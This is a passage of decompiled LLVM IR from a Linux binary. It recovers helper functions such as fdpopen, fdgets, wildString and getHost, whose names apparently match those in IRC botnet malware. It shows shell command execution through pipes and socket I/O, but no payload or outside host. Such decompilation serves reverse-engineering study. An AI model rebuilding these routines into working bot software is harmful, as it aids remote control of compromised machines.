  %v4_80488c2 = call i32 @__libc_send(i32 %arg1, i32 %v1_8048839, i32 %v3_80488af, i32 16384)
  %v1_80488d3 = call i32 @free(i32 %v1_8048839)
  store i32 %v0_804882d, i32* @edi, align 4
  ret i32 %v4_80488c2

; uselistorder directives
  uselistorder i32 %v1_8048839, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen() local_unnamed_addr {
entry:
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e6 = load i32, i32* @edi, align 4
  store i32 %v0_80488e6, i32* %stack_var_-8, align 4
  %v4_80488ea = ptrtoint i8* %tmp24 to i32
  %v2_80488ed = load i8, i8* %tmp24, align 1
  %v10_80488ef = icmp eq i8 %v2_80488ed, 114
  br i1 %v10_80488ef, label %dec_label_pc_80488fc, label %dec_label_pc_80488f3

dec_label_pc_80488f3:                             ; preds = %entry
  %v2_80488f6 = load i8, i8* %tmp24, align 1
  %v10_80488f8 = icmp eq i8 %v2_80488f6, 119
  %v1_80488fa = icmp eq i1 %v10_80488f8, false
  br i1 %v1_80488fa, label %dec_label_pc_8048ad1, label %dec_label_pc_80488fc

dec_label_pc_80488fc:                             ; preds = %dec_label_pc_80488f3, %entry
  %v1_80488ff = add i32 %v4_80488ea, 1
  %v1_8048900 = inttoptr i32 %v1_80488ff to i8*
  %v2_8048900 = load i8, i8* %v1_8048900, align 1
  %v4_8048902 = icmp eq i8 %v2_8048900, 0
  br i1 %v4_8048902, label %dec_label_pc_8048912, label %dec_label_pc_8048ad1

dec_label_pc_8048912:                             ; preds = %dec_label_pc_80488fc
  %v2_8048915 = ptrtoint i32* %stack_var_-24 to i32
  %v1_8048919 = call i32 @__GI_pipe(i32 %v2_8048915)
  %v2_8048921 = icmp slt i32 %v1_8048919, 0
  %v1_8048923 = icmp eq i1 %v2_8048921, false
  br i1 %v1_8048923, label %dec_label_pc_8048931, label %dec_label_pc_8048ad1

dec_label_pc_8048931:                             ; preds = %dec_label_pc_8048912
  %v0_8048931 = load i8*, i8** @global_var_80638e0.13, align 4
  %v2_8048936 = icmp eq i8* %v0_8048931, null
  %v1_8048938 = icmp eq i1 %v2_8048936, false
  br i1 %v1_8048938, label %bb, label %dec_label_pc_804893a

dec_label_pc_804893a:                             ; preds = %dec_label_pc_8048931
  %v1_804893a = call i32 @getdtablesize(i32 %tmp23)
  %tmp37 = icmp slt i32 %v1_804893a, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8048954, label %dec_label_pc_8048ad1

dec_label_pc_8048954:                             ; preds = %dec_label_pc_804893a
  %v2_8048957 = mul i32 %v1_804893a, 4
  %v1_804895e = call i32 @malloc(i32 %v2_8048957)
  %v1_8048966 = inttoptr i32 %v1_804895e to i8*
  store i8* %v1_8048966, i8** @global_var_80638e0.13, align 32
  %v2_8048970 = icmp eq i32 %v1_804895e, 0
  %v1_8048972 = icmp eq i1 %v2_8048970, false
  br i1 %v1_8048972, label %dec_label_pc_8048980, label %dec_label_pc_8048ad1

dec_label_pc_8048980:                             ; preds = %dec_label_pc_8048954
  %v1_8048983 = mul i32 %v1_804893a, 4
  store i32 %v1_804895e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048994 = and i32 %v1_804895e, -256
  %v5_8048996 = call i8* @_memset(i8* %v1_8048966, i32 %v1_8048994, i32 %v1_8048983)
  br label %bb

bb:                                               ; preds = %dec_label_pc_8048931, %dec_label_pc_8048980
  %v1_8048998 = call i32 @__vfork(i32 %tmp23)
  %v13_80489a6 = icmp eq i32 %v1_8048998, -1
  br i1 %v13_80489a6, label %dec_label_pc_80489b7, label %dec_label_pc_80489ac

dec_label_pc_80489ac:                             ; preds = %bb
  %v4_80489ac = icmp eq i32 %v1_8048998, 0
  %v2_80489e4 = load i8, i8* %tmp24, align 1
  %v10_80489e6 = icmp eq i8 %v2_80489e4, 114
  %v1_80489e8 = icmp eq i1 %v10_80489e6, false
  br i1 %v4_80489ac, label %dec_label_pc_80489e1, label %dec_label_pc_8048a82

dec_label_pc_80489b7:                             ; preds = %bb
  %v3_80489b7 = load i32, i32* %stack_var_-24, align 4
  %v1_80489be = call i32 @__libc_close(i32 %v3_80489b7)
  %v1_80489cd = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ad1

dec_label_pc_80489e1:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048a23, label %dec_label_pc_80489ea

dec_label_pc_80489ea:                             ; preds = %dec_label_pc_80489e1
  %v9_80489ed = icmp eq i32 %tmp19, 1
  br i1 %v9_80489ed, label %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, label %dec_label_pc_80489f2

dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge: ; preds = %dec_label_pc_80489ea
  br label %dec_label_pc_8048a12

dec_label_pc_80489f2:                             ; preds = %dec_label_pc_80489ea
  %v2_80489fb = call i32 @dup2(i32 %tmp19, i32 1)
  %v1_8048a0a = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a12

dec_label_pc_8048a12:                             ; preds = %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, %dec_label_pc_80489f2
  %v3_8048a12 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a19 = call i32 @__libc_close(i32 %v3_8048a12)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a23:                             ; preds = %dec_label_pc_80489e1
  %v3_8048a23 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a26 = icmp eq i32 %v3_8048a23, 0
  br i1 %v1_8048a26, label %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, label %dec_label_pc_8048a2a

dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge: ; preds = %dec_label_pc_8048a23
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a2a:                             ; preds = %dec_label_pc_8048a23
  %v2_8048a33 = call i32 @dup2(i32 %v3_8048a23, i32 0)
  %v3_8048a3b = load i32, i32* %stack_var_-24, align 4
  %v1_8048a42 = call i32 @__libc_close(i32 %v3_8048a3b)
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a4a:                             ; preds = %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, %dec_label_pc_8048a2a
  %v1_8048a51 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a59:                             ; preds = %dec_label_pc_8048a12, %dec_label_pc_8048a4a
  %v8_8048a70 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805833f.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_805833c.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_8058339.14 to i32), i32 %tmp18, i32 0)
  %v1_8048a7d = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048a82:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048aa2, label %dec_label_pc_8048a8b

dec_label_pc_8048a8b:                             ; preds = %dec_label_pc_8048a82
  %v3_8048a8b = load i32, i32* %stack_var_-24, align 4
  %v2_8048a98 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048aa2:                             ; preds = %dec_label_pc_8048a82
  %v3_8048aa8 = load i32, i32* %stack_var_-24, align 4
  %v2_8048aaf = call i32 @__libc_close(i32 %v3_8048aa8)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048ab7:                             ; preds = %dec_label_pc_8048a8b, %dec_label_pc_8048aa2
  %stack_var_-28.0 = phi i32 [ %v3_8048a8b, %dec_label_pc_8048a8b ], [ %tmp19, %dec_label_pc_8048aa2 ]
  %v2_8048aba = mul i32 %stack_var_-28.0, 4
  %v0_8048abf = load i8*, i8** @global_var_80638e0.13, align 4
  %v1_8048abf = ptrtoint i8* %v0_8048abf to i32
  %v2_8048ac4 = add i32 %v1_8048abf, %v2_8048aba
  %v2_8048ac9 = inttoptr i32 %v2_8048ac4 to i32*
  store i32 %v1_8048998, i32* %v2_8048ac9, align 4
  br label %dec_label_pc_8048ad1

dec_label_pc_8048ad1:                             ; preds = %dec_label_pc_8048954, %dec_label_pc_804893a, %dec_label_pc_8048912, %dec_label_pc_80488f3, %dec_label_pc_80488fc, %dec_label_pc_80489b7, %dec_label_pc_8048ab7
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_80489b7 ], [ %stack_var_-28.0, %dec_label_pc_8048ab7 ], [ -1, %dec_label_pc_80488fc ], [ -1, %dec_label_pc_80488f3 ], [ -1, %dec_label_pc_8048912 ], [ -1, %dec_label_pc_804893a ], [ -1, %dec_label_pc_8048954 ]
  %v3_8048ad4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048ad4, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v1_8048998, { 1, 2, 0 }
  uselistorder i32 %v1_804895e, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804893a, { 2, 0, 1 }
  uselistorder i8* %tmp24, { 0, 1, 3, 2 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 %tmp19, { 1, 6, 3, 4, 5, 0, 2 }
  uselistorder label %dec_label_pc_8048ad1, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048ab7, { 1, 0 }
  uselistorder label %dec_label_pc_8048a59, { 1, 0 }
  uselistorder label %dec_label_pc_8048a4a, { 1, 0 }
  uselistorder label %dec_label_pc_8048a12, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048ad9 = load i32, i32* @ebp, align 4
  store i32 %v0_8048ad9, i32* %stack_var_-4, align 4
  %v0_8048ae2 = load i8*, i8** @global_var_80638e0.13, align 4
  %v2_8048ae7 = icmp eq i8* %v0_8048ae2, null
  br i1 %v2_8048ae7, label %dec_label_pc_8048c35, label %dec_label_pc_8048aeb

dec_label_pc_8048aeb:                             ; preds = %entry
  %v1_8048ae2 = ptrtoint i8* %v0_8048ae2 to i32
  %v2_8048aee = mul i32 %tmp11, 4
  %v2_8048af8 = add i32 %v1_8048ae2, %v2_8048aee
  %v1_8048afb = inttoptr i32 %v2_8048af8 to i32*
  %v2_8048afb = load i32, i32* %v1_8048afb, align 4
  %v1_8048afd = icmp eq i32 %v2_8048afb, 0
  %v1_8048aff = icmp eq i1 %v1_8048afd, false
  br i1 %v1_8048aff, label %dec_label_pc_8048b10, label %dec_label_pc_8048c35

dec_label_pc_8048b10:                             ; preds = %dec_label_pc_8048aeb
  %v1_8048b16 = call i32 @__libc_close(i32 %tmp11)
  %v2_8048b21 = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048b28 = call i32 @sigemptyset(i32 %v2_8048b21)
  %v2_8048b3c = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 2)
  %v2_8048b50 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 3)
  %v2_8048b64 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 1)
  %v2_8048b6f = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048b7f = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048b7f = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048b7f, i32 %v2_8048b6f)
  %v2_8048b9e = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048b87

dec_label_pc_8048b87:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b10
  %v0_8048b8f = load i8*, i8** @global_var_80638e0.13, align 4
  %v1_8048b8f = ptrtoint i8* %v0_8048b8f to i32
  %v2_8048b94 = add i32 %v1_8048b8f, %v2_8048aee
  %v1_8048b97 = inttoptr i32 %v2_8048b94 to i32*
  %v2_8048b97 = load i32, i32* %v1_8048b97, align 4
  %v3_8048ba6 = call i32 @__libc_waitpid(i32 %v2_8048b97, i32 %v2_8048b9e, i32 0)
  %v13_8048bb4 = icmp eq i32 %v3_8048ba6, -1
  %v1_8048bbb = icmp eq i1 %v13_8048bb4, false
  br i1 %v1_8048bbb, label %dec_label_pc_8048bc9, label %dec_label_pc_8048bbd

dec_label_pc_8048bbd:                             ; preds = %dec_label_pc_8048b87
  %v1_8048bbd = call i32 @__errno_location(i32 %v3_8048ba6)
  %v1_8048bc2 = inttoptr i32 %v1_8048bbd to i32*
  %v2_8048bc2 = load i32, i32* %v1_8048bc2, align 4
  %v9_8048bc4 = icmp eq i32 %v2_8048bc2, 4
  br i1 %v9_8048bc4, label %dec_label_pc_8048b87, label %dec_label_pc_8048bc9

dec_label_pc_8048bc9:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b87
  %v13_8048bb4.lcssa = phi i1 [ true, %dec_label_pc_8048bbd ], [ false, %dec_label_pc_8048b87 ]
  %v3_8048bd7 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048bd7 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048bd7, i32 0)
  %v2_8048be5 = mul i32 %tmp8, 4
  %v0_8048bea = load i8*, i8** @global_var_80638e0.13, align 4
  %v1_8048bea = ptrtoint i8* %v0_8048bea to i32
  %v2_8048bef = add i32 %v1_8048bea, %v2_8048be5
  %v1_8048bf2 = inttoptr i32 %v2_8048bef to i32*
  store i32 0, i32* %v1_8048bf2, align 4
  br i1 %v13_8048bb4.lcssa, label %dec_label_pc_8048c29, label %dec_label_pc_8048c01

dec_label_pc_8048c01:                             ; preds = %dec_label_pc_8048bc9
  %v3_8048c01 = load i32, i32* %stack_var_-268, align 4
  %v1_8048c0d = and i32 %v3_8048c01, 65280
  %v2_8048c141 = udiv i32 %v1_8048c0d, 256
  br label %dec_label_pc_8048c29

dec_label_pc_8048c29:                             ; preds = %dec_label_pc_8048bc9, %dec_label_pc_8048c01
  %storemerge2 = phi i32 [ %v2_8048c141, %dec_label_pc_8048c01 ], [ -1, %dec_label_pc_8048bc9 ]
  %v2_8048c3b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048c35

dec_label_pc_8048c35:                             ; preds = %entry, %dec_label_pc_8048aeb, %dec_label_pc_8048c29
  %v2_8048c3b = phi i32 [ %v2_8048c3b.pre, %dec_label_pc_8048c29 ], [ %v0_8048ad9, %dec_label_pc_8048aeb ], [ %v0_8048ad9, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048c29 ], [ -1, %dec_label_pc_8048aeb ], [ -1, %entry ]
  store i32 %v2_8048c3b, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048ba6, { 1, 0 }
  uselistorder i32 %v2_8048aee, { 1, 0 }
  uselistorder i8* %v0_8048ae2, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_80638e0.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c29, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048c76

dec_label_pc_8048c53:                             ; preds = %dec_label_pc_8048c7e
  %v3_8048c62 = inttoptr i32 %v5_8048c81 to i32*
  %v4_8048c62 = call i32 @__libc_read(i32 %arg3, i32* %v3_8048c62, i32 1)
  %v4_8048c6d = add nuw i32 %storemerge115, 1
  %v8_8048c70 = icmp eq i32 %v4_8048c62, 0
  %v12_8048c70 = icmp eq i32 %v4_8048c62, 1
  %v1_8048c74 = icmp eq i1 %v12_8048c70, false
  br i1 %v1_8048c74, label %dec_label_pc_8048c8b, label %dec_label_pc_8048c76

dec_label_pc_8048c76:                             ; preds = %entry, %dec_label_pc_8048c53
  %v8_8048c7016 = phi i1 [ false, %entry ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  %storemerge115 = phi i32 [ 0, %entry ], [ %v4_8048c6d, %dec_label_pc_8048c53 ]
  %v5_8048c7c = icmp slt i32 %storemerge115, %arg2
  br i1 %v5_8048c7c, label %dec_label_pc_8048c7e, label %dec_label_pc_8048c8b

dec_label_pc_8048c7e:                             ; preds = %dec_label_pc_8048c76
  %v5_8048c81 = add i32 %storemerge115, %arg1
  %v1_8048c84 = add i32 %v5_8048c81, -1
  %v1_8048c85 = inttoptr i32 %v1_8048c84 to i8*
  %v2_8048c85 = load i8, i8* %v1_8048c85, align 1
  %v10_8048c87 = icmp eq i8 %v2_8048c85, 10
  %v1_8048c89 = icmp eq i1 %v10_8048c87, false
  br i1 %v1_8048c89, label %dec_label_pc_8048c53, label %dec_label_pc_8048c8b

dec_label_pc_8048c8b:                             ; preds = %dec_label_pc_8048c76, %dec_label_pc_8048c7e, %dec_label_pc_8048c53
  %v8_8048c70.lcssa = phi i1 [ %v8_8048c7016, %dec_label_pc_8048c76 ], [ %v8_8048c7016, %dec_label_pc_8048c7e ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  br i1 %v8_8048c70.lcssa, label %dec_label_pc_8048ca0, label %dec_label_pc_8048c91

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_8048c8b
  br label %dec_label_pc_8048ca0

dec_label_pc_8048ca0:                             ; preds = %dec_label_pc_8048c8b, %dec_label_pc_8048c91
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048c91 ], [ 0, %dec_label_pc_8048c8b ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048c81, { 1, 0 }
  uselistorder i32 %storemerge115, { 2, 0, 1 }
  uselistorder i1 %v8_8048c7016, { 1, 0 }
  uselistorder i1 %v8_8048c70, { 1, 0 }
  uselistorder i32 %v4_8048c62, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048ca0, { 1, 0 }
  uselistorder label %dec_label_pc_8048c8b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048c76, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048cd55 = ptrtoint i8* %arg1 to i32
  %v2_8048cd86 = load i8, i8* %arg1, align 1
  %v4_8048cda10 = icmp eq i8 %v2_8048cd86, 0
  br i1 %v4_8048cda10, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cb4:                             ; preds = %dec_label_pc_8048cde
  %v2_8048cb9 = mul i32 %stack_var_-8.011, 16
  %v2_8048cbf = load i8, i8* %stack_var_4.012, align 1
  %v3_8048cbf = zext i8 %v2_8048cbf to i32
  %v1_8048cc6 = mul nuw nsw i32 %v3_8048cbf, 4
  %v2_8048cc6 = add i32 %v1_8048cc6, ptrtoint (i32* @global_var_8058360.17 to i32)
  %v3_8048cc6 = inttoptr i32 %v2_8048cc6 to i32*
  %v4_8048cc6 = load i32, i32* %v3_8048cc6, align 4
  %v2_8048ccd = or i32 %v4_8048cc6, %v2_8048cb9
  %v5_8048cd2 = add i32 %v4_8048cd513, 1
  %v22_8048cd2 = inttoptr i32 %v5_8048cd2 to i8*
  %v2_8048cd8 = load i8, i8* %v22_8048cd2, align 1
  %v4_8048cda = icmp eq i8 %v2_8048cd8, 0
  br i1 %v4_8048cda, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cde:                             ; preds = %entry, %dec_label_pc_8048cb4
  %v4_8048cd513 = phi i32 [ %v5_8048cd2, %dec_label_pc_8048cb4 ], [ %v4_8048cd55, %entry ]
  %stack_var_4.012 = phi i8* [ %v22_8048cd2, %dec_label_pc_8048cb4 ], [ %arg1, %entry ]
  %stack_var_-8.011 = phi i32 [ %v2_8048ccd, %dec_label_pc_8048cb4 ], [ 0, %entry ]
  %v5_8048cde = icmp slt i32 %stack_var_-8.011, 0
  %v1_8048ce2 = icmp eq i1 %v5_8048cde, false
  br i1 %v1_8048ce2, label %dec_label_pc_8048cb4, label %dec_label_pc_8048ce4

dec_label_pc_8048ce4:                             ; preds = %dec_label_pc_8048cb4, %dec_label_pc_8048cde, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-8.011, %dec_label_pc_8048cde ], [ %v2_8048ccd, %dec_label_pc_8048cb4 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.011, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048cde, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp14 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048cec = load i32, i32* @ebx, align 4
  store i32 %v0_8048cec, i32* %stack_var_-8, align 4
  %v4_8048cf0 = ptrtoint i8* %arg1 to i32
  %v2_8048cf3 = load i8, i8* %arg1, align 1
  %v12_8048cff = icmp eq i8 %v2_8048cf3, 42
  br i1 %v12_8048cff, label %dec_label_pc_8048d2a, label %dec_label_pc_8048d05

dec_label_pc_8048d05:                             ; preds = %entry
  %v12_8048d05 = icmp eq i8 %v2_8048cf3, 63
  br i1 %v12_8048d05, label %dec_label_pc_8048d7c, label %dec_label_pc_8048d0b

dec_label_pc_8048d0b:                             ; preds = %dec_label_pc_8048d05
  %v4_8048d0b = icmp eq i8 %v2_8048cf3, 0
  br i1 %v4_8048d0b, label %dec_label_pc_8048d16, label %dec_label_pc_8048db6

dec_label_pc_8048d16:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048d19 = load i8, i8* %tmp14, align 1
  %v3_8048d19 = zext i8 %v2_8048d19 to i32
  br label %dec_label_pc_8048e17

dec_label_pc_8048d2a:                             ; preds = %entry
  %v1_8048d2d = add i32 %v4_8048cf0, 1
  %v5_8048d34 = inttoptr i32 %v1_8048d2d to i8*
  %v5_8048d35 = call i32 @wildString(i8* %v5_8048d34, i32 %arg2)
  %v1_8048d3d = icmp eq i32 %v5_8048d35, 0
  br i1 %v1_8048d3d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d41

dec_label_pc_8048d41:                             ; preds = %dec_label_pc_8048d2a
  %v2_8048d44 = load i8, i8* %tmp14, align 1
  %v4_8048d46 = icmp eq i8 %v2_8048d44, 0
  br i1 %v4_8048d46, label %dec_label_pc_8048d71, label %dec_label_pc_8048d4a

dec_label_pc_8048d4a:                             ; preds = %dec_label_pc_8048d41
  %v1_8048d4d = add i32 %arg2, 1
  %v5_8048d55 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048d4d)
  %v1_8048d5d = icmp eq i32 %v5_8048d55, 0
  br i1 %v1_8048d5d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d71

dec_label_pc_8048d6a:                             ; preds = %dec_label_pc_8048d4a, %dec_label_pc_8048d2a
  br label %dec_label_pc_8048d71

dec_label_pc_8048d71:                             ; preds = %dec_label_pc_8048d41, %dec_label_pc_8048d4a, %dec_label_pc_8048d6a
  %storemerge8 = phi i32 [ 0, %dec_label_pc_8048d6a ], [ 1, %dec_label_pc_8048d4a ], [ 1, %dec_label_pc_8048d41 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048d7c:                             ; preds = %dec_label_pc_8048d05
  %v2_8048d7f = load i8, i8* %tmp14, align 1
  %v4_8048d81 = icmp eq i8 %v2_8048d7f, 0
  br i1 %v4_8048d81, label %dec_label_pc_8048dae, label %dec_label_pc_8048d85

dec_label_pc_8048d85:                             ; preds = %dec_label_pc_8048d7c
  %v1_8048d88 = add i32 %arg2, 1
  %v1_8048d8c = add i32 %v4_8048cf0, 1
  %v5_8048d91 = inttoptr i32 %v1_8048d8c to i8*
  %v5_8048d92 = call i32 @wildString(i8* %v5_8048d91, i32 %v1_8048d88)
  %v1_8048d9a = icmp ne i32 %v5_8048d92, 0
  %. = zext i1 %v1_8048d9a to i32
  br label %dec_label_pc_8048dae

dec_label_pc_8048dae:                             ; preds = %dec_label_pc_8048d85, %dec_label_pc_8048d7c
  %storemerge5 = phi i32 [ 1, %dec_label_pc_8048d7c ], [ %., %dec_label_pc_8048d85 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048db6:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048db9 = load i8, i8* %arg1, align 1
  %v3_8048db9 = zext i8 %v2_8048db9 to i32
  %v2_8048dc4 = call i32 @__GI_toupper(i32 %v3_8048db9)
  store i32 %v2_8048dc4, i32* @ebx, align 4
  %v2_8048dd1 = load i8, i8* %tmp14, align 1
  %v3_8048dd1 = zext i8 %v2_8048dd1 to i32
  %v2_8048ddc = call i32 @__GI_toupper(i32 %v3_8048dd1)
  %v0_8048de4 = load i32, i32* @ebx, align 4
  %v12_8048de4 = icmp eq i32 %v0_8048de4, %v2_8048ddc
  %v1_8048de6 = icmp eq i1 %v12_8048de4, false
  br i1 %v1_8048de6, label %dec_label_pc_8048e11, label %dec_label_pc_8048de8

dec_label_pc_8048de8:                             ; preds = %dec_label_pc_8048db6
  %v1_8048deb = add i32 %arg2, 1
  %v1_8048def = add i32 %v4_8048cf0, 1
  %v5_8048df4 = inttoptr i32 %v1_8048def to i8*
  %v5_8048df5 = call i32 @wildString(i8* %v5_8048df4, i32 %v1_8048deb)
  %v1_8048dfd = icmp ne i32 %v5_8048df5, 0
  %.9 = zext i1 %v1_8048dfd to i32
  br label %dec_label_pc_8048e11

dec_label_pc_8048e11:                             ; preds = %dec_label_pc_8048de8, %dec_label_pc_8048db6
  %storemerge = phi i32 [ 1, %dec_label_pc_8048db6 ], [ %.9, %dec_label_pc_8048de8 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048e17:                             ; preds = %dec_label_pc_8048dae, %dec_label_pc_8048d71, %dec_label_pc_8048d16, %dec_label_pc_8048e11
  %stack_var_-24.0 = phi i32 [ %storemerge8, %dec_label_pc_8048d71 ], [ %storemerge5, %dec_label_pc_8048dae ], [ %v3_8048d19, %dec_label_pc_8048d16 ], [ %storemerge, %dec_label_pc_8048e11 ]
  %v3_8048e1a = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048e1a, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048cf3, { 2, 0, 1 }
  uselistorder i32 %v4_8048cf0, { 0, 2, 1 }
  uselistorder i8* %tmp14, { 3, 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8048e17, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048d71, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8048e2c = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048e2c, i32* %arg2, align 4
  %v10_8048e40 = icmp eq i32 %v1_8048e2c, -1
  %. = zext i1 %v10_8048e40 to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048e5a = load i32, i32* @ebp, align 4
  store i32 %v0_8048e5a, i32* %stack_var_-4, align 4
  %v4_8048e826 = ptrtoint i8* %arg1 to i32
  %v2_8048e857 = load i8, i8* %arg1, align 1
  %v3_8048e858 = zext i8 %v2_8048e857 to i32
  %v5_8048e859 = and i32 %v4_8048e826, -256
  %v6_8048e8510 = or i32 %v3_8048e858, %v5_8048e859
  %v4_8048e8711 = icmp eq i8 %v2_8048e857, 0
  %v1_8048e8912 = icmp eq i1 %v4_8048e8711, false
  br i1 %v1_8048e8912, label %dec_label_pc_8048e62, label %dec_label_pc_8048e8b

dec_label_pc_8048e62:                             ; preds = %entry, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge
  %v4_8048e8214 = phi i32 [ %v5_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %v4_8048e826, %entry ]
  %stack_var_4.013 = phi i8* [ %v22_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %arg1, %entry ]
  %v2_8048e65 = load i8, i8* %stack_var_4.013, align 1
  %v3_8048e65 = zext i8 %v2_8048e65 to i32
  %v1_8048e70 = call i32 @__GI_toupper(i32 %v3_8048e65)
  %v1_8048e7d = trunc i32 %v1_8048e70 to i8
  store i8 %v1_8048e7d, i8* %stack_var_4.013, align 1
  %v5_8048e7f = add i32 %v4_8048e8214, 1
  %v22_8048e7f = inttoptr i32 %v5_8048e7f to i8*
  %v2_8048e85 = load i8, i8* %v22_8048e7f, align 1
  %v4_8048e87 = icmp eq i8 %v2_8048e85, 0
  %v1_8048e89 = icmp eq i1 %v4_8048e87, false
  br i1 %v1_8048e89, label %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge, label %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge

